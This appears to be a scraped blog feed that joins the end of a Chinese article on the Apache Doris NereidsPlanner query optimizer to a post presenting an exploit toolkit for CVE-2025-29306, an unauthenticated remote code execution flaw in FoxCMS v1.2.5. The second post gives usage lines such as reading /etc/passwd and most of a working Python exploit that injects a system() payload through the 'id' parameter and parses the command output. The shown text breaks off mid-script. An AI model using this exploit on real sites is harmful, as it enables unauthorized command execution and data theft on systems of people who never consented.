<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JoinOrderJob</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Job</span> {
    <span class="hljs-comment">/**
     * DPHyp 优化
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 提取所有 Join 节点</span>
        List&lt;LogicalJoin&gt; joins = extractJoins(group);
        
        <span class="hljs-comment">// 2. 构建超图（Hypergraph）</span>
        <span class="hljs-type">Hypergraph</span> <span class="hljs-variable">hypergraph</span> <span class="hljs-operator">=</span> buildHypergraph(joins);
        
        <span class="hljs-comment">// 3. 动态规划计算最优 Join 顺序</span>
        Map&lt;BitSet, JoinPlan&gt; dpTable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        
        <span class="hljs-comment">// 初始化：单表子集</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; hypergraph.getNodeCount(); i++) {
            <span class="hljs-type">BitSet</span> <span class="hljs-variable">subset</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BitSet</span>();
            subset.set(i);
            dpTable.put(subset, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JoinPlan</span>(hypergraph.getNode(i)));
        }
        
        <span class="hljs-comment">// 枚举子集大小</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; size &lt;= hypergraph.getNodeCount(); size++) {
            <span class="hljs-comment">// 枚举所有大小为 size 的子集</span>
            <span class="hljs-keyword">for</span> (BitSet subset : enumerateSubsets(size, hypergraph.getNodeCount())) {
                <span class="hljs-comment">// 枚举分割方式</span>
                <span class="hljs-keyword">for</span> (BitSet leftSubset : enumerateSplits(subset)) {
                    <span class="hljs-type">BitSet</span> <span class="hljs-variable">rightSubset</span> <span class="hljs-operator">=</span> (BitSet) subset.clone();
                    rightSubset.andNot(leftSubset);
                    
                    <span class="hljs-comment">// 检查是否可以 Join</span>
                    <span class="hljs-keyword">if</span> (hypergraph.hasEdge(leftSubset, rightSubset)) {
                        <span class="hljs-comment">// 计算代价</span>
                        <span class="hljs-type">JoinPlan</span> <span class="hljs-variable">leftPlan</span> <span class="hljs-operator">=</span> dpTable.get(leftSubset);
                        <span class="hljs-type">JoinPlan</span> <span class="hljs-variable">rightPlan</span> <span class="hljs-operator">=</span> dpTable.get(rightSubset);
                        <span class="hljs-type">JoinPlan</span> <span class="hljs-variable">newPlan</span> <span class="hljs-operator">=</span> buildJoin(leftPlan, rightPlan);
                        
                        <span class="hljs-comment">// 更新最优计划</span>
                        updateBestPlan(dpTable, subset, newPlan);
                    }
                }
            }
        }
        
        <span class="hljs-comment">// 4. 获取全局最优计划</span>
        <span class="hljs-type">BitSet</span> <span class="hljs-variable">allNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BitSet</span>();
        allNodes.set(<span class="hljs-number">0</span>, hypergraph.getNodeCount());
        <span class="hljs-type">JoinPlan</span> <span class="hljs-variable">bestPlan</span> <span class="hljs-operator">=</span> dpTable.get(allNodes);
        
        <span class="hljs-comment">// 5. 替换原 Join 树</span>
        replaceJoinTree(group, bestPlan);
    }
}
</code></pre>
<p><strong>DPHyp vs Cascades</strong>：</p>



































<table><thead><tr><th>特性</th><th>Cascades</th><th>DPHyp</th></tr></thead><tbody><tr><td><strong>适用场景</strong></td><td>&lt; 10 个表 Join</td><td>&gt; 10 个表 Join</td></tr><tr><td><strong>搜索策略</strong></td><td>规则驱动 + 剪枝</td><td>动态规划</td></tr><tr><td><strong>计划形状</strong></td><td>所有可能</td><td>主要是 Bushy Tree</td></tr><tr><td><strong>时间复杂度</strong></td><td>指数级（有剪枝）</td><td>O(3^n)</td></tr><tr><td><strong>优点</strong></td><td>更灵活，探索更全面</td><td>更快，适合大规模 Join</td></tr></tbody></table>
<h3 data-id="heading-34">5.3 物化视图自动改写</h3>
<p><strong>核心思想</strong>：</p>
<ul>
<li>自动识别查询可以使用的物化视图</li>
<li>改写查询计划使用物化视图</li>
<li>提高查询性能</li>
</ul>
<p><strong>改写流程</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[用户查询] --&gt; B[提取查询模式]
    B --&gt; C[匹配物化视图]
    C --&gt; D[生成改写计划]
    D --&gt; E[代价比较]
    E --&gt; F{物化视图更优?}
    F --&gt;|是| G[使用物化视图]
    F --&gt;|否| H[使用原查询]
</code></pre>
<p><strong>改写规则示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MaterializedViewAggregateRule</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMaterializedViewAggregateRule</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;Plan&gt; <span class="hljs-title function_">transform</span><span class="hljs-params">(Plan plan, CascadesContext context)</span> {
        LogicalAggregate&lt;?&gt; aggregate = (LogicalAggregate&lt;?&gt;) plan;
        
        <span class="hljs-comment">// 1. 查找匹配的物化视图</span>
        List&lt;MTMV&gt; matchedMVs = findMatchedMaterializedViews(
            aggregate, 
            context.getMaterializationContexts()
        );
        
        List&lt;Plan&gt; results = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">for</span> (MTMV mv : matchedMVs) {
            <span class="hljs-comment">// 2. 生成改写计划</span>
            <span class="hljs-type">Plan</span> <span class="hljs-variable">rewrittenPlan</span> <span class="hljs-operator">=</span> rewrite(aggregate, mv);
            
            <span class="hljs-keyword">if</span> (rewrittenPlan != <span class="hljs-literal">null</span>) {
                results.add(rewrittenPlan);
            }
        }
        
        <span class="hljs-keyword">return</span> results;
    }
    
    <span class="hljs-keyword">private</span> Plan <span class="hljs-title function_">rewrite</span><span class="hljs-params">(LogicalAggregate&lt;?&gt; query, MTMV mv)</span> {
        <span class="hljs-comment">// 检查 Group By 是否匹配</span>
        <span class="hljs-keyword">if</span> (!matchGroupBy(query, mv)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-comment">// 检查聚合函数是否匹配</span>
        <span class="hljs-keyword">if</span> (!matchAggregateFunctions(query, mv)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-comment">// 生成从物化视图读取的计划</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalOlapScan</span>(
            mv.getRelatedTable(), 
            <span class="hljs-comment">/* ... */</span>
        );
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-35">6. NereidsPlanner 完整流程（综合）</h2>
<h3 data-id="heading-36">6.1 端到端优化流程</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant User as 用户查询
    participant Parser
    participant Analyzer
    participant Rewriter
    participant Optimizer
    participant PostProcessor
    
    User-&gt;&gt;Parser: SQL文本
    Parser-&gt;&gt;Parser: 语法解析
    Parser-&gt;&gt;Analyzer: LogicalPlan
    
    Analyzer-&gt;&gt;Analyzer: 类型推导
    Analyzer-&gt;&gt;Analyzer: 名称解析
    Analyzer-&gt;&gt;Analyzer: 子查询标准化
    Analyzer-&gt;&gt;Rewriter: 已分析的LogicalPlan
    
    Rewriter-&gt;&gt;Rewriter: 谓词下推
    Rewriter-&gt;&gt;Rewriter: 列裁剪
    Rewriter-&gt;&gt;Rewriter: 常量折叠
    Rewriter-&gt;&gt;Rewriter: 子查询Unnesting
    Rewriter-&gt;&gt;Optimizer: 重写后的LogicalPlan
    
    Optimizer-&gt;&gt;Optimizer: 初始化Memo
    Optimizer-&gt;&gt;Optimizer: 统计信息推导
    Optimizer-&gt;&gt;Optimizer: DPHyp Join优化
    Optimizer-&gt;&gt;Optimizer: Cascades优化
    Optimizer-&gt;&gt;Optimizer: 代价估算
    Optimizer-&gt;&gt;Optimizer: 选择最优计划
    Optimizer-&gt;&gt;PostProcessor: PhysicalPlan
    
    PostProcessor-&gt;&gt;PostProcessor: Runtime Filter生成
    PostProcessor-&gt;&gt;PostProcessor: 分布式属性传播
    PostProcessor-&gt;&gt;User: 最终执行计划
</code></pre>
<h3 data-id="heading-37">6.2 关键优化阶段</h3>
<p><strong>1. Analyze 阶段</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">analyze</span><span class="hljs-params">(<span class="hljs-type">boolean</span> showAnalyzeProcess)</span> {
    cascadesContext.newAnalyzer().analyze();
    
    <span class="hljs-comment">// 主要工作：</span>
    <span class="hljs-comment">// - 类型推导（Type Inference）</span>
    <span class="hljs-comment">// - 名称解析（Name Resolution）</span>
    <span class="hljs-comment">// - 子查询标准化</span>
    <span class="hljs-comment">// - 权限检查</span>
}
</code></pre>
<p><strong>2. Rewrite 阶段</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rewrite</span><span class="hljs-params">(<span class="hljs-type">boolean</span> showRewriteProcess)</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rewriter</span>(cascadesContext).execute();
    
    <span class="hljs-comment">// 主要工作：</span>
    <span class="hljs-comment">// - 谓词下推（Predicate Pushdown）</span>
    <span class="hljs-comment">// - 列裁剪（Column Pruning）</span>
    <span class="hljs-comment">// - 常量折叠（Constant Folding）</span>
    <span class="hljs-comment">// - 子查询去关联（Decorrelation）</span>
    <span class="hljs-comment">// - 表达式简化</span>
}
</code></pre>
<p><strong>3. Optimize 阶段</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">optimize</span><span class="hljs-params">(<span class="hljs-type">boolean</span> showPlanProcess)</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Optimizer</span>(cascadesContext).execute();
    
    <span class="hljs-comment">// 主要工作：</span>
    <span class="hljs-comment">// - Memo 初始化</span>
    <span class="hljs-comment">// - 统计信息推导</span>
    <span class="hljs-comment">// - DPHyp Join 顺序优化</span>
    <span class="hljs-comment">// - Exploration 规则应用</span>
    <span class="hljs-comment">// - Implementation 规则应用</span>
    <span class="hljs-comment">// - 代价计算和最优计划选择</span>
}
</code></pre>
<p><strong>4. PostProcess 阶段</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> PhysicalPlan <span class="hljs-title function_">postProcess</span><span class="hljs-params">(PhysicalPlan physicalPlan)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlanPostProcessors</span>(cascadesContext).process(physicalPlan);
    
    <span class="hljs-comment">// 主要工作：</span>
    <span class="hljs-comment">// - Runtime Filter 生成</span>
    <span class="hljs-comment">// - Enforcer 插入（Sort、Shuffle）</span>
    <span class="hljs-comment">// - 分布式属性传播</span>
    <span class="hljs-comment">// - TopN Filter 生成</span>
}
</code></pre>
<h3 data-id="heading-38">6.3 完整示例</h3>
<p><strong>查询</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> 
    c.region,
    <span class="hljs-built_in">SUM</span>(o.amount) <span class="hljs-keyword">as</span> total
<span class="hljs-keyword">FROM</span> orders o
<span class="hljs-keyword">JOIN</span> customers c <span class="hljs-keyword">ON</span> o.customer_id <span class="hljs-operator">=</span> c.id
<span class="hljs-keyword">WHERE</span> o.order_date <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-01-01'</span>
  <span class="hljs-keyword">AND</span> c.status <span class="hljs-operator">=</span> <span class="hljs-string">'active'</span>
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> c.region
<span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">SUM</span>(o.amount) <span class="hljs-operator">&gt;</span> <span class="hljs-number">10000</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> total <span class="hljs-keyword">DESC</span>
LIMIT <span class="hljs-number">10</span>;
</code></pre>
<p><strong>优化过程</strong>：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-number">1</span>. Parser: SQL -&gt; LogicalPlan
   <span class="hljs-built_in">LogicalLimit</span>(<span class="hljs-number">10</span>)
     <span class="hljs-built_in">LogicalSort</span>(total DESC)
       <span class="hljs-built_in">LogicalFilter</span>(<span class="hljs-built_in">SUM</span>(amount) &gt; <span class="hljs-number">10000</span>)
         <span class="hljs-built_in">LogicalAggregate</span>(GROUP BY region, <span class="hljs-built_in">SUM</span>(amount))
           <span class="hljs-built_in">LogicalJoin</span>(customer_id = id)
             <span class="hljs-built_in">LogicalFilter</span>(order_date &gt;= <span class="hljs-string">'2024-01-01'</span>)
               <span class="hljs-built_in">LogicalOlapScan</span>(orders)
             <span class="hljs-built_in">LogicalFilter</span>(status = <span class="hljs-string">'active'</span>)
               <span class="hljs-built_in">LogicalOlapScan</span>(customers)

<span class="hljs-number">2</span>. Rewrite: 谓词下推 + 列裁剪
   <span class="hljs-built_in">LogicalLimit</span>(<span class="hljs-number">10</span>)
     <span class="hljs-built_in">LogicalSort</span>(total DESC)
       <span class="hljs-built_in">LogicalAggregate</span>(GROUP BY region, <span class="hljs-built_in">SUM</span>(amount), HAVING &gt; <span class="hljs-number">10000</span>)
         <span class="hljs-built_in">LogicalJoin</span>(customer_id = id)
           <span class="hljs-built_in">LogicalOlapScan</span>(orders, Filter: order_date &gt;= <span class="hljs-string">'2024-01-01'</span>)
           <span class="hljs-built_in">LogicalOlapScan</span>(customers, Filter: status = <span class="hljs-string">'active'</span>)

<span class="hljs-number">3</span>. Optimize: 物理算子选择
   <span class="hljs-built_in">PhysicalTopN</span>(<span class="hljs-number">10</span>, total DESC)
     <span class="hljs-built_in">PhysicalHashAggregate</span>(GROUP BY region, <span class="hljs-built_in">SUM</span>(amount), HAVING &gt; <span class="hljs-number">10000</span>)
       <span class="hljs-built_in">PhysicalHashJoin</span>(Build: customers, Probe: orders, Broadcast)
         <span class="hljs-built_in">PhysicalOlapScan</span>(orders, RuntimeFilter on customer_id)
         <span class="hljs-built_in">PhysicalOlapScan</span>(customers)

<span class="hljs-number">4</span>. PostProcess: Runtime Filter
   PhysicalTopN
     PhysicalHashAggregate
       PhysicalHashJoin
         <span class="hljs-built_in">PhysicalOlapScan</span>(orders) [Apply RuntimeFilter from customers.id]
         <span class="hljs-built_in">PhysicalOlapScan</span>(customers) [Build RuntimeFilter on id]
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[FoxCMS v1.2.5 远程代码执行漏洞利用工具集]]></title>    <link>https://juejin.cn/post/7592075359379537972</link>    <guid>https://juejin.cn/post/7592075359379537972</guid>    <pubDate>2026-01-06T07:28:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592075359379537972" data-draft-id="7591942733365444642" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="FoxCMS v1.2.5 远程代码执行漏洞利用工具集"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-01-06T07:28:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            FoxCMS v1.2.5 远程代码执行漏洞利用工具集
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:28:02.000Z" title="Tue Jan 06 2026 07:28:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">项目标题与描述</h2>
<p>本项目是针对 CVE-2025-29306 安全漏洞的概念验证（PoC）工具集。该漏洞影响 FoxCMS v1.2.5 及更早版本，允许攻击者通过 <code>/images/index.html</code> 端点中的 <code>id</code> 参数，利用 PHP 反序列化漏洞实现远程代码执行（RCE），无需任何身份验证即可在目标系统上执行任意命令。</p>
<p>项目包含两个独立的漏洞利用脚本：一个用 Python 编写，另一个用 Bash 编写，均能有效验证目标系统是否存在该高危漏洞。</p>
<h2 data-id="heading-1">功能特性</h2>
<ul>
<li><strong>无认证远程代码执行</strong>：无需任何登录凭证即可在目标服务器上执行系统命令。</li>
<li><strong>双语言实现</strong>：提供 Python 和 Bash 两种脚本，适应不同渗透测试环境。</li>
<li><strong>精确输出解析</strong>：利用 XPath 定位 HTML 响应中的命令输出结果，提高结果准确性。</li>
<li><strong>简单易用</strong>：只需提供目标 URL 和待执行的命令即可进行漏洞验证。</li>
<li><strong>安全研究用途</strong>：专为安全研究人员、渗透测试人员和系统管理员设计，用于评估和防御该漏洞。</li>
</ul>
<h2 data-id="heading-2">安装指南</h2>
<h3 data-id="heading-3">Python 版本要求</h3>
<p><strong>系统要求</strong>：</p>
<ul>
<li>Python 3.6 或更高版本</li>
<li>Linux/macOS/Windows（支持 Bash 的环境）</li>
</ul>
<p><strong>安装步骤</strong>：</p>
<ol>
<li>克隆或下载本工具集到本地：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> &lt;repository-url&gt;
<span class="hljs-built_in">cd</span> foxcms-rce-poc
</code></pre>
<ol start="2">
<li>安装必要的 Python 依赖：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">pip install requests lxml
</code></pre>
<ol start="3">
<li>（可选）为 Bash 版本安装必要的系统工具：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 对于 Ubuntu/Debian</span>
sudo apt-get install curl xmllint python3

<span class="hljs-comment"># 对于 CentOS/RHEL</span>
sudo yum install curl libxml2 python3
</code></pre>
<p><strong>依赖项</strong>：</p>
<ul>
<li>Python 版本：<code>requests</code>、<code>lxml</code></li>
<li>Bash 版本：<code>curl</code>、<code>xmllint</code>、<code>python3</code></li>
</ul>
<h2 data-id="heading-4">使用说明</h2>
<h3 data-id="heading-5">Python 版本使用示例</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 基本用法</span>
python3 CVE-2025-29306.py &lt;目标URL&gt; <span class="hljs-string">"&lt;命令&gt;"</span>

<span class="hljs-comment"># 实际示例：检测系统信息</span>
python3 CVE-2025-29306.py http://example.com <span class="hljs-string">"id; uname -a"</span>

<span class="hljs-comment"># 实际示例：列出目录内容</span>
python3 CVE-2025-29306.py http://vulnerable-site.com <span class="hljs-string">"ls -la /var/www"</span>
</code></pre>
<h3 data-id="heading-6">Bash 版本使用示例</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 基本用法</span>
./CVE-2025-29306.sh &lt;目标URL&gt; <span class="hljs-string">"&lt;命令&gt;"</span>

<span class="hljs-comment"># 实际示例</span>
./CVE-2025-29306.sh http://example.com <span class="hljs-string">"cat /etc/passwd"</span>
</code></pre>
<h3 data-id="heading-7">API 概览</h3>
<p>两个工具都接受相同的参数格式：</p>
<ol>
<li><strong>目标URL</strong>：存在漏洞的 FoxCMS 实例地址（如 <code>http://192.168.1.100</code>）</li>
<li><strong>命令</strong>：要在目标系统上执行的系统命令（如 <code>"whoami"</code>）</li>
</ol>
<p>执行流程：</p>
<ol>
<li>工具将命令嵌入 PHP 反序列化载荷</li>
<li>发送特制请求到 <code>/images/index.html</code> 端点</li>
<li>解析响应并提取命令执行结果</li>
<li>显示输出并报告漏洞状态</li>
</ol>
<h2 data-id="heading-8">核心代码</h2>
<h3 data-id="heading-9">Python 版本核心代码</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-string">"""
PoC for CVE-2025-29306: Unauthenticated RCE in FoxCMS v1.2.5
Unsafe deserialization of 'id' param in /images/index.html leading to arbitrary command execution.

Usage: python3 CVE-2025-29306.py &lt;target_url&gt; &lt;command&gt;
Example: python3 CVE-2025-29306.py http://example.com "id; uname -a"

Dependencies: requests, lxml
"""</span>

<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> html

<span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">target_url, command</span>):
    <span class="hljs-comment"># 构造PHP载荷：${@print_r(@system("COMMAND"))} - 通过unserialize反序列化执行</span>
    payload = <span class="hljs-string">f"${{@print_r(@system('<span class="hljs-subst">{command}</span>'))}}"</span>
    encoded_payload = quote(payload, safe=<span class="hljs-string">''</span>)

    <span class="hljs-comment"># 易受攻击的端点</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{target_url.rstrip(<span class="hljs-string">'/'</span>)}</span>/images/index.html?id=<span class="hljs-subst">{encoded_payload}</span>"</span>

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] Targeting: <span class="hljs-subst">{url}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] Executing command: <span class="hljs-subst">{command}</span>"</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 发送GET请求（无需认证）</span>
        response = requests.get(url, timeout=<span class="hljs-number">10</span>, verify=<span class="hljs-literal">False</span>)
        <span class="hljs-keyword">if</span> response.status_code != <span class="hljs-number">200</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[-] Unexpected status code: <span class="hljs-subst">{response.status_code}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># 解析HTML响应；根据漏洞详情输出反映在&lt;header&gt;下的&lt;ul&gt;中</span>
        tree = html.fromstring(response.content)
        ul_elements = tree.xpath(<span class="hljs-string">'/html/body/header/div[1]/div[2]/div[1]/ul/text()'</span>)
        
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ul_elements:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] No output found in expected XPath. Target may not be vulnerable or output hidden."</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># 清理并提取输出（去除标签/空白）</span>
        output = <span class="hljs-string">' '</span>.join([elem.strip() <span class="hljs-keyword">for</span> elem <span class="hljs-keyword">in</span> ul_elements <span class="hljs-keyword">if</span> elem.strip()])
        <span class="hljs-keyword">if</span> output:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] SUCCESS! Command Output:\n<span class="hljs-subst">{output}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] Command executed but no output captured."</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 如果响应被处理，仍然易受攻击</span>

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[-] Request failed: <span class="hljs-subst">{e}</span>"</span>)
